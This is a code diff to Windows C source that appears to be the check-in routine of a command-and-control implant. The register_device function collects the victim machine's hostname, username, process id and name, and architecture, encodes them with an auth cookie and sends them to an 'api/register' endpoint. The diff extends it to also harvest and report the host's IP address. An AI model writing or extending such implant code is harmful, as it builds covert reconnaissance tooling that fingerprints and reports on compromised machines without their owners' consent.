@@ -37,6 +37,7 @@ struct {
     DWORD   pid;
     CHAR*   name;
     CHAR    arch[MAX_PATH];
+    CHAR*   address;
 } info;
 
 struct {
@@ -351,7 +352,7 @@ void register_device() {
     PIP_ADAPTER_INFO adapter = NULL;
     ULONG adapter_size = sizeof(IP_ADAPTER_INFO);
 
-    data.format = "%s,%s,%s,%lu,%s,%s";
+    data.format = "%s,%s,%s,%lu,%s,%s,%s";
     transport.path = "api/register";
 
     if (GetComputerNameA(info.hostname, &default_length)) {
@@ -397,17 +398,18 @@ void register_device() {
     GetAdaptersInfo(NULL, &adapter_size);
     if ((adapter = LocalAlloc(LPTR, adapter_size))) {
         if (GetAdaptersInfo(adapter, &adapter_size) == NO_ERROR) {
-            log_info("Address: %s", adapter->IpAddressList.IpAddress.String);
+            info.address = _strdup(adapter->IpAddressList.IpAddress.String);
+            log_info("Address: %s", info.address);
         } else {
             log_error("Error: %lu\n", dw_error);
         }
     }
 
-    DWORD pointer_length = strlen(data.format) + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch);
+    DWORD pointer_length = strlen(data.format) + strlen(auth.cookie) + strlen(info.hostname) + strlen(info.username) + 4 + strlen(info.name) + strlen(info.arch) + strlen(info.address);
     CHAR* data_pointer = malloc(pointer_length);
-    sprintf_s(data_pointer, pointer_length, data.format, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch);
+    sprintf_s(data_pointer, pointer_length, data.format, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch, info.address);
 
-    DWORD data_length = pointer_length - strlen(data.format) + 5;
+    DWORD data_length = pointer_length - strlen(data.format) + 6;
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
@@ -421,6 +423,7 @@ void register_device() {
         free(data_pointer);
         free(buffer);
         free(info.name);
+        free(info.address);
         CloseHandle(snapshot);
 }
 
